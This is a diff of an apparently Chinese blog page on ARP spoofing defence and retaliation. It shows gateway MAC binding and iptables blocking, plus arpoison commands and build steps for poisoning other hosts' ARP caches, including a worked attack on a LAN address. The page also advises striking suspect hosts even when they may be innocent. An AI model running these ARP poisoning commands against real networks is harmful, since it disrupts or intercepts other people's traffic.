@@ -40,22 +40,10 @@ sudo touch /etc/arp_fanji && sudo chmod +x /etc/arp_fanji</textarea>
 arpoison -i eth0 -d 192.168.1.131 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 11:11:11:11:11:11
 </textarea>
 
-
-
- 
-
- 
-
- 
-
-————————————————————————————————
-
+<hr>
 以下是网上搜索到的分解操作
 
-————————————————————————————————
-
- 
-
+<hr>
 防守：
 
 绑定网关MAC：sudo arp -s 网关IP 网关MAC
@@ -66,9 +54,9 @@ arpoison -i eth0 -d 192.168.1.131 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 11:11:1
 
 可疑IP：有可能是攻击者本机，也可能是被攻击者设为代理的主机，宁可错杀！
 
-————————————————————————————————
 
- 反击：
+<hr>
+反击：
 
 sudo arpoison -i 接口 -d 目标IP -s 源IP -t 目标网关MAC -r 源MAC -n 次数
 
@@ -83,11 +71,9 @@ sudo arpoison -i eth0 -d 网关IP -s 本机IP -t ff:ff:ff:ff:ff:ff -r 本机MAC
 示例：攻击192.168.1.2
 
 sudo arpoison -i eth0 -d 192.168.1.2 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 错误的MAC   
-
-————————————————————————————————
+<hr>
 
 安装方法：
- 
 
 参照：http://hi.baidu.com/yk103/blog/item/f39e253f9d6aeeed55e72361.html/cmtid/912acdeae74294dbd439c951
 
@@ -104,11 +90,7 @@ cd arpoison
 gcc arpoison.c /usr/lib/libnet.a -o arpoison 
 
 mv arpoison /usr/sbin
-
-————————————————————————————————
-
- 
-
+<hr>
 绑定网关
 
 查看网关IP和MAC：arp -nv
@@ -116,8 +98,6 @@ mv arpoison /usr/sbin
 假设网关IP 192.168.1.1   MAC 40:16:9f:e1:ab:80
 
 临时绑定：sudo arp -s 192.168.1.1 40:16:9f:e1:ab:80
-
- 
 
 自动绑定：
 
@@ -133,12 +113,7 @@ echo '192.168.1.1 40:16:9f:e1:ab:80' > /etc/ip-mac
 
 echo ‘arp -f /etc/ip-mac’>>/etc/init.d/rc.local
 
- 
-
- 
-
-————————————————————————————————
-
+<hr>
 反击示例
 
 假设网关           192.168.1.1            40:16:9f:e1:ab:80
@@ -156,3 +131,4 @@ echo 1 > /proc/sys/net/ipv4/icmp_echo_ignore_all
 iptables -t filter -A INPUT -s 192.168.1.131 -i eth0 -j DROP
 
 arpoison -i eth0 -d 192.168.1.131 -s 192.168.1.1 -t ff:ff:ff:ff:ff:ff -r 11:11:11:11:11:11
+<hr>
